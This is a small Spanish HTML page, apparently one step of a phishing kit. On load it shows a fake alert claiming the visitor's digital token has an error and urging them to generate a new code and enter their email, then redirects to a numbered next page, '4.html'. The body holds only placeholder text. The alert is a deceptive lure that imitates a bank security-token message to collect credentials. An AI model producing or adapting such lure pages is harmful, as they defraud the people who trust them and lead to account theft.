<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alerta en Carga</title>
    <script>
        function mostrarAlerta() {
            // Muestra la alerta
            alert("ERROR EN SU TOKEN DIGITAL! \nVALIDE Y GENERE UN NUEVO CODIGO E INGRESA SU CORREO ELECTRONICO PARA CONTINUAR");
            // Redirige a otro índice
            window.location.href = "4.html"; // Cambia "index.html" a la URL que desees
        }

        // Llama a la función cuando se carga la página
        window.onload = mostrarAlerta;
    </script>
</head>
<body>
    <h1>Contenido de la Página</h1>
    <p>Esta página mostrará una alerta al cargar.</p>
</body>
</html>
